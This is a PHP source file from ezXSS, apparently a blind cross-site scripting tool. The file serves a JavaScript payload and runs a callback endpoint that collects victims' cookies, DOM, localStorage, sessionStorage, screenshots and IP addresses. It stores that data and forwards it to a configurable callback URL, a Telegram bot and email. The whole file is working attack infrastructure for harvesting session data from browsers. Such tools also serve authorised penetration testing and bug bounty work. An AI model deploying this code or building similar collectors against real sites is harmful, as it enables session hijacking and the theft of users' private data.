<?php

class Route
{

    private $validTemplates;

    /**
     * Default values stored
     * @method __construct
     */
    public function __construct()
    {
        $this->validTemplates = [
            'login',
            'dashboard',
            'install',
            'settings',
            'payload',
            'reports',
            'archive',
            'report',
            'update'
        ];

        $this->user = new User();
        $this->database = new Database();
        $this->component = new Component();
        $this->basic = new Basic();

        $this->verifySettings();
    }

    /**
     * Check if template request is valid and return, else redirect
     * @method template
     * @param string $file Requested file link
     * @return string HTML for page
     */
    public function template($file): string
    {
        if (!in_array($file, $this->validTemplates, true)) {
            return $this->redirect('login');
        }

        if ($file === 'report' && isset(explode('/', $_SERVER['REQUEST_URI'])[4])) {
            return $this->redirect('reports');
        }

        if ($this->user->isLoggedIn() && ($file === 'login' || $file === 'install')) {
            return $this->redirect('dashboard');
        }

        if (!$this->user->isLoggedIn() && $file !== 'login' && $file !== 'install' && $file !== 'report' && $file !== 'update') {
            return $this->redirect('login');
        }

        if ($file === 'report' && ((is_numeric(explode('/', $_SERVER['REQUEST_URI'])[3]) && !$this->user->isLoggedIn(
                    )) || empty(explode('/', $_SERVER['REQUEST_URI'])[3]))) {
            return $this->redirect('login');
        }

        if ($file !== 'install' && !$this->database->isInstalled()) {
            return $this->redirect('install');
        }

        if ($file === 'install' && $this->database->isInstalled()) {
            return $this->redirect('login');
        }

        if($file !== 'update' && $file !== 'install' && $this->database->fetchSetting('version') !== version) {
            return $this->redirect('update');
        }

        if($file === 'update' && $this->database->fetchSetting('version') === version) {
            return $this->redirect('login');
        }

        return $this->parseTemplate($file);
    }

    /**
     * Redirect browser to link
     * @method redirect
     * @param string $page Page link to redirect to
     * @return string
     */
    private function redirect($page): string
    {
        $_SESSION['redirect'] = $_SERVER['REQUEST_URI'];
        header("Location: /".adminURL."/{$page}");
        return 'Redirect';
    }

    /**
     * Parse values from template
     * @method parseTemplate
     * @param string $file Requested file link
     * @return string HTML for page
     */
    private function parseTemplate($file): string
    {
        $html = str_replace(
            ['{{template}}', '{{menu}}', '{{title}}', '{{version}}'],
            [
                $this->getFile($file),
                ($this->user->isLoggedIn()) ? $this->basic->htmlBlocks('menu') : $this->basic->htmlBlocks('menuHidden'),
                ucwords($file),
                version
            ],
            $this->basic->htmlBlocks('main')
        );

        preg_match_all('/{{(.*?)\[(.*?)]}}/', $html, $matches);
        foreach ($matches[1] as $key => $value) {
            $html = str_replace(
                $matches[0][$key],
                $this->component->$value((string)($matches[2][$key])),
                $html
            );
        }

        return $html;
    }

    /**
     * Return html of provided template
     * @method parseTemplate
     * @param string $file Requested template
     * @param string $extension
     * @return string HTML of template
     */
    private function getFile($file, $extension = 'html'): string
    {
        return file_get_contents(__DIR__ . "/../templates/{$file}.{$extension}");
    }

    /**
     * Puts callback info in database and sends out mail
     * @method callback
     * @param string $phpInput POST information
     * @return string github.com/ssl/ezXSS
     */
    public function callback($phpInput): string
    {
        $json = json_decode($phpInput, false);
        $json->screenshot = $json->screenshot ?? '';

        $setting = [];
        foreach ($this->database->query('SELECT * FROM settings') as $settings) {
            $setting[$settings['setting']] = $settings['value'];
        }

        $userIp = $json->ip ?? $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'];
        $domain = htmlspecialchars($_SERVER['SERVER_NAME']);
        $json->origin = str_replace(['https://', 'http://'], '', $json->origin);

        $json->uri = substr($json->uri, 0, 1000);
        $json->referer = substr($json->referer, 0, 1000);
        $json->origin = substr($json->origin, 0, 500);
        $json->payload = substr($json->payload, 0, 500);
        $json->{'user-agent'} = substr($json->{'user-agent'}, 0, 500);

        $blockedDomains = explode(',', $setting['blocked-domains']);
        $whitelistDomains = explode(',', $setting['whitelist-domains']);

        foreach($blockedDomains as $blockedDomain) {
            if($json->origin == $blockedDomain) {
                return 'github.com/ssl/ezXSS';
            }
            if (strpos($blockedDomain, '*') !== false) {
                $blockedDomain = str_replace('*', '(.*)', $blockedDomain);
                if(preg_match('/^'.$blockedDomain.'$/', $json->origin)) {
                    return 'github.com/ssl/ezXSS';
                }
            }
        }

        if ($setting['whitelist-domains'] !== '') {
            $foundWhitelist = false;
            foreach ($whitelistDomains as $whitelistDomain) {
                if ($json->origin == $whitelistDomain) {
                    $foundWhitelist = true;
                }
                if (strpos($whitelistDomain, '*') !== false) {
                    $whitelistDomain = str_replace('*', '(.*)', $whitelistDomain);
                    if (preg_match('/^' . $whitelistDomain . '$/', $json->origin)) {
                        $foundWhitelist = true;
                    }
                }
            }
            if(!$foundWhitelist) {
                return 'github.com/ssl/ezXSS';
            }
        }

        $doubleReport = false;
        if ($setting['filter-save'] == 0 || $setting['filter-alert'] == 0) {
            $searchCommonReport = $this->database->fetch(
                'SELECT id FROM reports WHERE cookies = :cookies AND dom = :dom AND origin = :origin AND referer = :referer AND uri = :uri AND `user-agent` = :userAgent AND ip = :ip LIMIT 1',
                [
                    ':cookies' => $json->cookies,
                    ':dom' => $json->dom,
                    ':origin' => $json->origin,
                    ':referer' => $json->referer,
                    ':uri' => $json->uri,
                    ':userAgent' => $json->{'user-agent'},
                    ':ip' => $userIp
                ]
            );

            if (isset($searchCommonReport['id'])) {
                if ($setting['filter-save'] == 0 && $setting['filter-alert'] == 0) {
                    return 'github.com/ssl/ezXSS';
                } else {
                    $doubleReport = true;
                }
            }
        }

        if ($setting['dompart'] > 0 && strlen($json->dom) > $setting['dompart']) {
            $domExtra = '&#13;&#10;&#13;&#10;View full dom on the report page or change this setting on /settings';
        } else {
            $domExtra = '';
        }

        if (($doubleReport && ($setting['filter-save'] == 1 || $setting['filter-alert'] == 1)) || (!$doubleReport)) {
            if (!empty($json->screenshot)) {
                $screenshot = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $json->screenshot));
                $screenshotName = time() . md5(
                        $json->uri . time() . bin2hex(openssl_random_pseudo_bytes(16))
                    ) . bin2hex(openssl_random_pseudo_bytes(5));
                $saveImage = fopen(__DIR__ . "/../assets/img/report-{$screenshotName}.png", 'w');
                fwrite($saveImage, $screenshot);
                fclose($saveImage);
            }

            $shareId = sha1(bin2hex(openssl_random_pseudo_bytes(32)) . time());
            $reportId = $this->database->lastInsertId(
                'INSERT INTO reports (`shareid`, `cookies`, `dom`, `origin`, `referer`, `uri`, `user-agent`, `ip`, `time`, `screenshot`, `localstorage`, `sessionstorage`, `payload`) VALUES (:shareid, :cookies, :dom, :origin, :referer, :uri, :userAgent, :ip, :time, :screenshot, :localstorage, :sessionstorage, :payload)',
                [
                    'shareid' => $shareId,
                    ':cookies' => $json->cookies,
                    ':dom' => $json->dom,
                    ':origin' => $json->origin,
                    ':referer' => $json->referer,
                    ':uri' => $json->uri,
                    ':userAgent' => $json->{'user-agent'},
                    ':ip' => $userIp,
                    ':time' => time(),
                    ':screenshot' => ($screenshotName ?? ''),
                    ':localstorage' => json_encode($json->localstorage),
                    ':sessionstorage' => json_encode($json->sessionstorage),
                    ':payload' => $json->payload
                ]
            );

            if (($doubleReport && $setting['filter-alert'] == 1) || (!$doubleReport)) {
                if($setting['alert-callback'] === '1') {
                    $cb = curl_init((parse_url($setting['callback-url'], PHP_URL_SCHEME) ? '' : 'https://') . $setting['callback-url']);
                    curl_setopt($cb, CURLOPT_CUSTOMREQUEST, 'POST');
                    curl_setopt($cb, CURLOPT_POSTFIELDS, $phpInput);
                    curl_setopt($cb, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($cb, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
                    curl_exec($cb);
                }

                if($setting['alert-telegram'] === '1') {
                    if (!empty($json->screenshot)) {
                        $json->screenshot = $this->basic->screenshotPath($screenshotName);
                    }

                    $markdownTemplate = str_replace(
                        [
                            '{{adminURL}}', '{{id}}', '{{domain}}', '{{url}}', '{{ip}}',
                            '{{referer}}', '{{payload}}', '{{user-agent}}', '{{cookies}}', '{{localstorage}}',
                            '{{sessionstorage}}', '{{dom}}', '{{origin}}', '{{time}}', '{{screenshot}}'
                        ],
                        [
                            adminURL, $reportId, $domain, $json->uri, $userIp, $json->referer !== '' ? $json->referer : ' ', $json->payload,
                            $json->{'user-agent'}, $json->cookies, json_encode($json->localstorage), json_encode($json->sessionstorage),
                            substr($json->dom, 0, $setting['dompart']) . $domExtra, $json->origin, date('F j Y, g:i a'), $json->screenshot !== '' ? $json->screenshot : ' '
                        ],
                        $this->basic->htmlBlocks('telegram')
                    );

                    $cb = curl_init('https://api.telegram.org/bot' . $setting['telegram-bottoken'] . '/sendMessage');
                    curl_setopt($cb, CURLOPT_CUSTOMREQUEST, 'POST');
                    curl_setopt($cb, CURLOPT_POSTFIELDS, json_encode(['chat_id' => $setting['telegram-chatid'], 'parse_mode' => 'markdown', 'text' => $markdownTemplate]));
                    curl_setopt($cb, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($cb, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
                    curl_exec($cb);
                }

                if($setting['alert-mail'] === '1') {
                    if (!empty($json->screenshot)) {
                        $json->screenshot = $this->basic->screenshotPathImg($screenshotName);
                    }

                    $htmlTemplate = str_replace(
                        [
                            '{{adminURL}}',
                            '{{id}}',
                            '{{domain}}',
                            '{{url}}',
                            '{{ip}}',
                            '{{referer}}',
                            '{{payload}}',
                            '{{user-agent}}',
                            '{{cookies}}',
                            '{{localstorage}}',
                            '{{sessionstorage}}',
                            '{{dom}}',
                            '{{origin}}',
                            '{{time}}',
                            '{{screenshot}}'
                        ],
                        [
                            adminURL,
                            $reportId,
                            htmlspecialchars($domain),
                            htmlspecialchars($json->uri),
                            htmlspecialchars($userIp),
                            htmlspecialchars($json->referer),
                            htmlspecialchars($json->payload),
                            htmlspecialchars($json->{'user-agent'}),
                            htmlspecialchars($json->cookies),
                            htmlspecialchars(json_encode($json->localstorage)),
                            htmlspecialchars(json_encode($json->sessionstorage)),
                            htmlspecialchars(substr($json->dom, 0, $setting['dompart'])) . $domExtra,
                            htmlspecialchars($json->origin),
                            date('F j Y, g:i a'),
                            $json->screenshot
                        ],
                        $this->basic->htmlBlocks('mail')
                    );

                    $headers[] = 'From: ' . $setting['emailfrom'];
                    $headers[] = 'MIME-Version: 1.0';
                    $headers[] = 'Content-type: text/html; charset=iso-8859-1';
                    mail(
                        $setting['email'],
                        '[ezXSS] XSS on ' . htmlspecialchars($json->uri),
                        $htmlTemplate,
                        implode("\r\n", $headers)
                    );
                }
            }
        }

        return 'github.com/ssl/ezXSS';
    }

    /**
     * Return javascript payload code with custom JS
     * @method jsPayload
     * @return string Javascript payload code
     */
    public function jsPayload(): string
    {
        if (!$this->database->isInstalled()) {
            return $this->redirect('install');
        }

        $payload = $_SERVER['REQUEST_URI'];
        $payloadFile = 'payload';

        if(!in_array($payload, ['', '/'], true)) {
            $payload = preg_replace('/[^a-zA-Z0-9]/', '', $payload);
            if(file_exists(__DIR__ . "/../templates/{$payload}.js")) {
                $payloadFile = $payload;
            }
        }

        $noCollect = '';
        foreach ($this->database->fetchAll('SELECT setting,value FROM settings WHERE setting LIKE "%collect_%"', []) as $setting) {
            if($setting['value'] === '0' && $setting['setting'] !== 'collect_screenshot') {
                $noCollect .= "'" . str_replace('collect_', '', $setting['setting']) . "',";
            }
        }

        $pages = $this->database->fetchSetting('extract-pages');
        $pages = explode('|||', $pages);
        $pagesString = '';
        foreach($pages as $page) {
            if(empty($page)) {
                continue;
            }
            $pagesString .= "'".htmlspecialchars($page, ENT_QUOTES)."',";
        }

        return str_replace(
            ['{{domain}}', '{{screenshot}}', '{{customjs}}', '{{version}}', '{{payload}}', '{{payloadFile}}', '{{noCollect}}', '{{pages}}'],
            [
                $this->basic->domain(),
                (($this->database->fetchSetting('collect_screenshot')) ? $this->getFile('screenshot', 'js') : ''),
                $this->database->fetchSetting('customjs'),
                version,
                htmlspecialchars("//{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}"),
                $payloadFile,
                rtrim($noCollect, ','),
                rtrim($pagesString, ',')
            ],
            $this->getFile($payloadFile, 'js')
        );
    }

    /**
     * Verify settings before doing anything else
     * @method verifySettings
     */
    private function verifySettings(): void
    {
        $killSwitchPassowrd = $this->database->fetchSetting('killswitch');
        if(!empty($killSwitchPassowrd)) {
            if(isset($_GET['pass']) && $_GET['pass'] === $killSwitchPassowrd) {
                $this->database->query("UPDATE settings SET value = '' WHERE setting = 'killswitch';");
            } else {
                http_response_code(404);
                exit();
            }
        }
    }
}
